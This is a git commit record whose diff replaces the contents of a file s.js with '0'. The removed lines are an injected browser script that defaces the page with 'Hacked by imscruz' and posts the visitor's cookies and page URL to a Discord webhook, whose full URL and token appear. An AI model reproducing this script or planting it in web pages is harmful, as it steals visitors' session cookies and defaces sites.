b6c9daed0f16cb0cf49c79a1bf8668c46559f3c2
scruz <101042936+imscruz@users.noreply.github.com>
2025-08-26 19:54:02 +0300

    Update s.js

--- s.js
+++ s.js
@@ -1,6 +1,1 @@
-document.body.innerHTML='Hacked by imscruz';
-fetch('https://discord.com/api/webhooks/1117039673462771804/qgw3Scd_LE5bFNBVZc-XKpgD2VFkwAsBBDmzq7JXbk6fK82Bvfyaf-Z6ifqeNtnD8894',{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({content:'IP: '+fetch('https://api.ipify.org').then(r=>r.text()).then(ip=>'Cookie: '+document.cookie+'\nURL: '+location.href)})
-})
+0
